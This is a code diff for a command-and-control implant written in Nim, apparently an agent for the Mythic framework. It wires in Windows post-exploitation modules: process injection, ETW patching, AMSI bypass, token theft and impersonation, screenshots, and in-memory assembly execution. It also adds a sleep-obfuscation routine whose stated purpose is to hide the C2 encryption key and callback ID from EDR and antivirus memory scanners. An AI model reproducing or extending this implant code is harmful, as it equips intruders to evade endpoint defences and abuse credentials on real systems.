@@ -25,6 +25,16 @@ import commands/execution/wget, commands/execution/curl
 import commands/execution/sudo, commands/execution/runas
 when defined(windows):
   import commands/execution/earlybird
+  import commands/execution/inject
+  import commands/execution/etwpatch
+  import commands/execution/amsi
+  import commands/execution/screenshot
+  import commands/execution/reg
+  import commands/execution/steal_token
+  import commands/execution/make_token
+  import commands/execution/rev2self
+  import commands/execution/inline_execute
+  import commands/execution/execute_assembly
 import commands/env/env, commands/env/getenv, commands/env/setenv
 import commands/control/echo_cmd, commands/control/exit_cmd, commands/control/kill_cmd
 import commands/control/sleep_cmd, commands/control/socks
@@ -88,6 +98,16 @@ proc newAphroditeAgent*(): AphroditeAgent =
   initSudo();     initRunas()
   when defined(windows):
     initEarlyBird()
+    initInject()
+    initEtwpatch()
+    initAmsi()
+    initScreenshot()
+    initReg()
+    initStealToken()
+    initMakeToken()
+    initRev2Self()
+    initInlineExecute()
+    initExecuteAssembly()
   initChmod();    initChown();    initFind();     initWrite()
   initJobs();     initJobkill();  initConfig()
 
@@ -120,7 +140,29 @@ proc sleepWithJitter(ag: AphroditeAgent) =
   if ag.state.jitter > 0:
     let reduction = int(float(ms) * float(ag.state.jitter) / 100.0 * rand(1.0))
     ms = max(100, ms - reduction)
-  sleep(ms)
+
+  when defined(windows) and defined(sleepObf):
+    # Sleep obfuscation: XOR-encrypt AES key and callback ID during sleep to
+    # hide C2 crypto material from userland memory scanners (Elastic EDR, AV).
+    # Both are restored before the next beacon so comms work normally.
+    var keyMask: array[32, byte]
+    for i in 0..31: keyMask[i] = byte(rand(255))
+    for i in 0..<ag.aesKey.len:
+      ag.aesKey[i] = ag.aesKey[i] xor keyMask[i mod 32]
+
+    var idMask: array[36, byte]
+    for i in 0..35: idMask[i] = byte(rand(255))
+    for i in 0..<ag.mythicID.len:
+      ag.mythicID[i] = char(byte(ag.mythicID[i]) xor idMask[i mod 36])
+
+    sleep(ms)
+
+    for i in 0..<ag.aesKey.len:
+      ag.aesKey[i] = ag.aesKey[i] xor keyMask[i mod 32]
+    for i in 0..<ag.mythicID.len:
+      ag.mythicID[i] = char(byte(ag.mythicID[i]) xor idMask[i mod 36])
+  else:
+    sleep(ms)
 
 proc sendMessage(ag: AphroditeAgent, body: JsonNode): JsonNode =
   let jsonStr = $body
@@ -175,7 +217,7 @@ when defined(useEke):
 
     stderr.writeLine(hidstr("[*] EKE: sending staging_rsa (RSA-2048)"))
 
-    ## Send encrypted with PSK (ag.aesKey set by setupPsk — empty = plaintext)
+    ## Send encrypted with PSK (ag.aesKey set by setupPsk — empty = plaintext staging)
     let raw = ag.transport.post(ag.payloadUUID, ag.aesKey, jsonBody)
     if raw.len == 0:
       ctx.ekaFree()
